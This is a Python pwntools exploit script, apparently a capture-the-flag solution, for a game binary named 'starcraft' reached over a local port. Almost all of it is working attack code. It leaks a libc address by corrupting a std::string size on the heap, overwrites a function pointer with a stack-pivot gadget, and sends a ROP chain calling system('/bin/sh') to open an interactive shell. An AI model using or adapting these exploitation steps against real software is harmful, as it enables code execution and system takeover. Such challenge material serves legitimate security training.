# i found the sleep() functions necrassary on the machine, since it runs so slowly

IS_DEBUG = False
offsetof__GI_exit = 264
stdstring_obj_size_param_offset = 288
offset_libc_ptr = 0x148

# GADGETS
# LOCAL 0x00000000000411ad : add rsp, 0x118 ; ret
# REMOTE 0x00000000000353ba : add rsp, 0x148 ; ret
if IS_DEBUG == True:
    rsp_shift_gadget = 0x411ad
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
    gadget_remove = 0x118
    context.log_level = "debug"
else:
    rsp_shift_gadget = 0x00000000000353ba
    libc = ELF("./libc-2.23.so")
    gadget_remove = 0x148



context.binary = "./starcraft"

def wait_for_message(target, message):
    while True:
        try:
            p.sendline(message)
            sleep(0.1)
            data = p.recv(timeout=6)
            if target in data:                                                                                                                                                                                                                                                   
                return True                                                                                                                                                                                                                                                      
        except EOFError:                                                                                                                                                                                                                                                         
            return False                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                 
def leakDump():                                                                                                                                                                                                                                                                  
    # leaking libc adress by dumping the heap by maniplulating std::string                                                                                                                                                                                                       
    # obj and changing his size                                                                                                                                                                                                                                                  
    payload = stdstring_obj_size_param_offset*b"A"                                                                                                                                                                                                                               
    payload += p64(offset_libc_ptr)                                                                                                                                                                                                                                              
    pause()                                                                                                                                                                                                                                                                      
    try:                                                                                                                                                                                                                                                                         
        # print artwork                                                                                                                                                                                                                                                          
        p.sendline(b"1")                                                                                                                                                                                                                                                         
        p.sendline(payload)                                                                                                                                                                                                                                                      
        sleep(0.5)                                                                                                                                                                                                                                                               
        p.recvuntil(b"artwork")                                                                                                                                                                                                                                                  
        leak_dump = p.recv()                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                 
        print(leak_dump)                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                 
        end = leak_dump.index(b'(me) *')                                                                                                                                                                                                                                         
        leak = leak_dump[end-16:end-8]                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                                                                 
        print(f"leak: {leak} and {hex(u64(leak))}")                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                                                 
        return u64(leak)                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                 
    except:                                                                                                                                                                                                                                                                      
        return 0                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                 
# overwrites a functionptr with a gadget                                                                                                                                                                                                                                         
def overwrite_fp():                                                                                                                                                                                                                                                              
    jump_to = libc.address + rsp_shift_gadget                                                                                                                                                                                                                                    
    payload = (offsetof__GI_exit)*b"\x00" + p64(jump_to) + 2*p64(0x15)                                                                                                                                                                                                           
    sleep(0.1)                                                                                                                                                                                                                                                                   
    p.sendline(b"1")                                                                                                                                                                                                                                                             
    p.sendline(payload)                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
def flood_stack():                                                                                                                                                                                                                           
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
    # wait for "wanna cheat" and use BOF to overwrite the previous stackframe (and shift rsp to it)                                                                                                                                          
    if wait_for_message(b'wanna cheat? (yes/no)', b'0') == False:                                                                                                                                                                            
        raise EOFError                                                                                                                                                                                                                       
                                                                                                                                                                                                                                             
    print("Reached cheat BOF")                                                                                                                                                                                                               
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
    # craft: pop rdi -> binsh, ret -> system()                                                                                                                                                                                               
    rop = ROP(libc)                                                                                                                                                                                                                          

    binsh  = next(libc.search(b"/bin/sh\x00"))
    rop.raw(rop.find_gadget(["pop rdi", "ret"])[0])
    rop.raw(binsh)
    rop.raw(libc.sym["system"])
    chain = rop.chain()
    padding = b"B" * (gadget_remove - 0xf8)
    payload = padding + chain


    p.send(payload)
    p.interactive()




for i in range(100):
    #p = process("./starcraft")
    p = remote("0.0.0.0", 10041)
    # templer -> arcon
    p.sendline(b"6")
    p.sendline(b"2")
    p.sendline(b"2")
    p.sendline(b"2")
    p.sendline(b"1")
    sleep(0.1)
    # get to level where you can use ascii artwork and overflow heap
    TARGET = b"Stage 12 start!"
    if wait_for_message(TARGET, b'0') == False:
        continue
    
    log.success('Reached stage 12')
    sleep(0.1)
    leak = leakDump()
    if leak == 0 or None:
        continue

    # leak libc
    libc_base = leak - libc.sym.exit
    libc.address = libc_base
    print(f"leak - exit = base, {hex(leak)} - {hex(libc.sym.exit)} = {hex(libc_base)}")
    
    sleep(0.1)
    overwrite_fp()
    flood_stack()
    break

